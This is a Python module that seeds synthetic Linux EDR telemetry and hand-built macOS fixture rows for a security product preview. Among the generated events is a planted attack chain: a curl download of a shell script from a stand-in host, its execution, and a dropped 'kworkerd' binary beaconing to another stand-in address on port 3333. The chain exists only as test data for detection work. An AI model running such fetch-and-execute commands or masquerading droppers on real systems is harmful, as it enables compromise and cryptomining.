"""E3 PREVIEW-ONLY (E1: STRIP). Non-Windows preview devices, served by the replay path in kushu_import.
LINUX: SYNTHETIC lines through E1's real Linux sensor path (canonical_bridge.parse -> bind_process_identity ->
observation_doc -> trajectory_window projection). MACOS: FIXTURE-ONLY rows (E1 has no macOS parser)."""
from __future__ import annotations

import json
import random
from typing import Any

from . import kushu_import as kx

M, H, D = 60_000, 3_600_000, 86_400_000
LNX = {"device": "dev_syn_lnx01", "endpoint": "ep_syn_lnx01", "host": "syn-build-07", "tenant": "ten_syn_preview"}
MAC = {"device": "dev_fix_mac01", "host": "SYN-MBP-14"}
LNX_LABEL = "SYNTHETIC · E1 Linux sensor path (canonical_bridge → observation_doc → E1 projection) · not production"
MAC_LABEL = "FIXTURE-ONLY · no E1 macOS parser exists · hand-built rows in the E1 projection shape · not production"


def _iso(ms: int) -> str:
    return kx._iso(ms).replace("Z", "+00:00")


def linux_lines(ref: int, seed: int = 701) -> list[str]:
    r, out, pid = random.Random(seed), [], [3000]

    def proc(t, image, path, cmd, parent="systemd", ppid=1, user="builder", sha=None):
        pid[0] += 7
        out.append(json.dumps({"activity": "PROCESS", "observed_at": _iso(t + 1500), "pid": pid[0], "ppid": ppid, "image": image,
                               "image_path": path, "command_line": cmd, "user": user, "start_time": _iso(t),
                               "start_ticks": t // 10, "parent_image": parent, "parent_lookup_state": "OBSERVED",
                               **({"sha256": sha} if sha else {})}))
        return pid[0], t

    def file(t, path, sha=None, size=2048):
        out.append(json.dumps({"activity": "FILE", "operation": "CREATE", "path": path, "filename": path.rsplit("/", 1)[-1],
                               "size": size, "observed_at": _iso(t), **({"sha256": sha} if sha else {}),
                               "not_observed": ["actor_process"]}))

    def net(t, p, ip, port):
        out.append(json.dumps({"activity": "NETWORK", "protocol": "tcp", "local_ip": "10.20.0.7", "local_port": 40000 + r.randint(0, 9999),
                               "remote_ip": ip, "remote_port": port, "direction": "OUTBOUND", "pid": p[0],
                               "process_start_ticks": p[1] // 10, "process_start_time": _iso(p[1]), "observed_at": _iso(t)}))

    for k in range(6, -1, -1):
        t0 = ref - k * D - 10 * H
        sshd = proc(t0, "sshd", "/usr/sbin/sshd", "sshd: builder [priv]")
        bash = proc(t0 + 4000, "bash", "/bin/bash", "-bash", "sshd", sshd[0])
        t = t0 + M
        for _ in range(30 + r.randint(0, 20)):
            t += r.randint(20_000, 9 * M)
            x = r.random()
            if x < 0.35:
                g = proc(t, "git", "/usr/bin/git", r.choice(["git fetch origin", "git pull --rebase", "git status"]), "bash", bash[0])
                net(t + 800, g, "140.82.112.4", 443)
            elif x < 0.6:
                n = proc(t, "node", "/usr/bin/node", "node /srv/app/build/page.js", "bash", bash[0])
                file(t + 1200, f"/srv/app/build/chunk-{r.randint(100, 999)}.js")
                net(t + 1500, n, "104.16.24.35", 443)
            elif x < 0.8:
                file(t, f"/srv/app/.git/objects/pack/{r.randint(10, 99)}.pack.gz_", size=r.randint(10_000, 900_000))
            else:
                proc(t, "python3", "/usr/bin/python3", "python3 -m pytest -q", "bash", bash[0])
        if k == 1:
            c = proc(t0 + 3 * H, "curl", "/usr/bin/curl", "curl -fsSL http://198.51.100.77/i.sh -o /tmp/.i.sh", "bash", bash[0])
            net(t0 + 3 * H + 600, c, "198.51.100.77", 80)
            file(t0 + 3 * H + 900, "/tmp/.i.sh", sha="5e" * 32, size=1830)
            s = proc(t0 + 3 * H + 2000, "sh", "/bin/sh", "sh /tmp/.i.sh", "bash", bash[0])
            file(t0 + 3 * H + 2600, "/tmp/.cache/kworkerd", sha="19125e57" + "ab" * 24 + "f2886350", size=812_000)
            kw = proc(t0 + 3 * H + 3000, "kworkerd", "/tmp/.cache/kworkerd", "/tmp/.cache/kworkerd -B", "sh", s[0], sha="19125e57" + "ab" * 24 + "f2886350")
            for i in range(4):
                net(t0 + 3 * H + (5 + i) * M, kw, "203.0.113.90", 3333)
    return out


async def seed_linux(db, stage_db, ref: int) -> dict[str, Any]:
    from edr_plane import trajectory_window as tw
    from edr_plane.canonical_bridge import bind_process_identity, parse
    from v2.ingestion.telemetry_bridge import observation_doc
    env = {"source": "nivxforge-linux-sensor", "connector_id": LNX["endpoint"], "collector_id": LNX["endpoint"],
           "collection_method": "PROC_POLL", "parser_version": "1.0.0"}
    docs = []
    for i, line in enumerate(linux_lines(ref)):
        c = parse(line)
        c["event_id"] = f"cev_{LNX['endpoint']}_{i:06d}"
        c["raw_ref"] = {"raw_id": f"raw_{LNX['endpoint']}_{i:06d}", "collection": "edr_raw_events"}
        c["host"] = {"host_id": LNX["endpoint"], "hostname": LNX["host"]}
        c = bind_process_identity(c, LNX["endpoint"])
        obs = json.loads(line)["observed_at"]
        d = observation_doc(c, envelope={**env, "source_event_id": c["event_id"], "collection_timestamp": obs}, tenant_id=LNX["tenant"])
        d["ingest_time"] = obs
        docs.append(d)
    coll = stage_db[tw.COLLECTION]
    await coll.delete_many({})
    await coll.insert_many([dict(d) for d in docs])
    dev = next((d["event"].get("device_iid") for d in docs if d.get("event", {}).get("device_iid")), LNX["device"])
    ident = {"device_iid": dev, "hostname": LNX["host"], "tenant_id": LNX["tenant"], "endpoint_id": LNX["endpoint"]}
    tw._proj_cache.clear()
    proj = await tw._projected(stage_db, ident=ident, refs=[LNX["endpoint"], LNX["host"], dev], docs_limit=None)
    lanes = {ln["lane_index"]: ln for ln in proj["cat"]["lanes"]}
    events = []
    for row in proj["rows"]:
        ms = tw._row_ms(row)
        if ms is None:
            continue
        events.append({**row, "timestamp_instant_ms": ms, "lane_label": (lanes.get(row.get("lane_index")) or {}).get("label")})
    tw._proj_cache.clear()
    await db[kx.EV].delete_many({"device": LNX["device"]})
    body = {"format": kx.FORMAT, "device": LNX["device"], "source_origin": "e3-preview:linux-sensor-path", "events": events,
            "identity": {"device_iid": LNX["device"], "endpoint_id": LNX["endpoint"], "hostname": LNX["host"]},
            "computer": {"hostname": LNX["host"], "device_iid": LNX["device"], "operating_system": "Ubuntu 22.04 LTS (synthetic)",
                         "connector_version": "nivxforge-linux-sensor 1.0.0 (synthetic)", "platform": "linux"}}
    res = await kx.ingest(db, body, label=LNX_LABEL, source="SYNTHETIC_E1_LINUX_PATH")
    return {**res, "observation_docs": len(docs), "projected_rows": len(proj["rows"])}


def mac_events(ref: int) -> list[dict[str, Any]]:
    t0 = ref - 2 * D - 5 * H
    pi = {"launchd": "proc_mac_launchd", "zsh": "proc_mac_zsh", "node": "proc_mac_node", "softwareupdated": "proc_mac_swu"}
    rows: list[tuple[int, dict[str, Any]]] = [
        (0, {"event_type": "process_create", "image": "/bin/zsh", "process_iid": pi["zsh"], "parent_process_iid": pi["launchd"],
             "parent_image": "/sbin/launchd", "command_line": "-zsh", "pid": "811", "file_sha256": "245e0321" + "cd" * 24 + "565f8c11"}),
        (40_000, {"event_type": "process_create", "image": "/usr/local/bin/node", "process_iid": pi["node"], "parent_process_iid": pi["zsh"],
                  "parent_image": "/bin/zsh", "command_line": "node page.js", "pid": "902"}),
        (52_000, {"event_type": "file_create", "file": "/Users/dev/site/page.js", "image": "/usr/local/bin/node", "process_iid": pi["node"]}),
        (61_000, {"event_type": "file_create", "file": "/Users/dev/site/.git/objects/pack/38.pack.gz_", "image": "/usr/local/bin/node",
                  "process_iid": pi["node"]}),
        (75_000, {"event_type": "network_connect", "network": "151.101.1.69:443", "image": "/usr/local/bin/node", "process_iid": pi["node"]}),
        (3 * H, {"event_type": "process_create", "image": "/System/Library/PrivateFrameworks/SoftwareUpdate.framework/softwareupdated",
                 "process_iid": pi["softwareupdated"], "parent_process_iid": pi["launchd"], "parent_image": "/sbin/launchd", "pid": "120"}),
        (3 * H + 9000, {"event_type": "file_create", "file": "/Library/Updates/MacBookProUpdate.pkg", "image":
                        "/System/Library/PrivateFrameworks/SoftwareUpdate.framework/softwareupdated", "process_iid": pi["softwareupdated"]}),
        (3 * H + 20_000, {"event_type": "file_create", "file": "/Users/dev/Downloads/notes.txt", "image": "/usr/local/bin/node",
                          "process_iid": pi["node"], "is_detection": True,
                          "detection": {"name": "E3-FIXTURE-EICAR-TXT", "severity": "MEDIUM", "engine": "fixture"}}),
    ]
    out = []
    for i, (dt, e) in enumerate(rows):
        ms = t0 + dt
        out.append({"event_iid": f"obs_fixmac{i:05d}#fix{i:07d}", "observation_id": f"obs_fixmac{i:05d}", "timestamp_instant_ms": ms,
                    "timestamp": kx._iso(ms), "timestamp_basis": "FIXTURE", "user": "dev", "lane_id": f"fix::{i}",
                    "lane_label": (e.get("file") or e.get("network") or e.get("image") or "").rsplit("/", 1)[-1], **e})
    return out


async def seed_mac(db, ref: int) -> dict[str, Any]:
    await db[kx.EV].delete_many({"device": MAC["device"]})
    body = {"format": kx.FORMAT, "device": MAC["device"], "source_origin": "e3-preview:macos-fixture", "events": mac_events(ref),
            "identity": {"device_iid": MAC["device"], "hostname": MAC["host"]},
            "computer": {"hostname": MAC["host"], "device_iid": MAC["device"], "operating_system": "macOS 14 (fixture-only)",
                         "connector_version": "none: no E1 macOS parser", "platform": "macos"}}
    return await kx.ingest(db, body, label=MAC_LABEL, source="FIXTURE_ONLY_NO_E1_MACOS_PARSER")
